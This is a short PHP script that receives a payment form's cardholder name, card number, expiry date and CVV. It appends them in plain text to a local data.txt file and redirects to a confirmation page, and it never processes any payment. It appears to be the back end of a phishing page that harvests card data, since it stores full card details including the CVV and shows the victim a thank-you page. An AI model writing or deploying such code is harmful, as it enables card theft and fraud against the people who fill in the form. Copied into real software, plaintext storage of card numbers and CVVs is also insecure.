<?php
    // Check if the form is submitted
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Capture the POST data
        $cardName = isset($_POST['card-name']) ? $_POST['card-name'] : 'No Cardholder Name';
        $cardNumber = isset($_POST['card-number']) ? $_POST['card-number'] : 'No Card Number';
        $expiryMonth = isset($_POST['expiry-month']) ? $_POST['expiry-month'] : 'No Expiry Month';
        $expiryYear = isset($_POST['expiry-year']) ? $_POST['expiry-year'] : 'No Expiry Year';
        $cvv = isset($_POST['cvv']) ? $_POST['cvv'] : 'No CVV';

        // Prepare the data to write to the file
        $data = "Cardholder Name: " . $cardName . " | Card Number: " . $cardNumber .
                " | Expiry Date: " . $expiryMonth . "/" . $expiryYear . " | CVV: " . $cvv . "\n";

        // Use absolute path for the file storage location
        $file = __DIR__ . "/data.txt";

        // Attempt to open and write to the file
        if ($fileHandle = fopen($file, "a")) {
            fwrite($fileHandle, $data);
            fclose($fileHandle);

            // Redirect to a "Thank You" page after the details
            header("Location: confirmation.html");
            exit();
        } else {
            // Show an error if unable to open the file
            echo "Error: Unable to write data.";
        }
    } else {
        // Redirect to the payment page if accessed directly
        header("Location: form.html");
        exit();
    }
?>
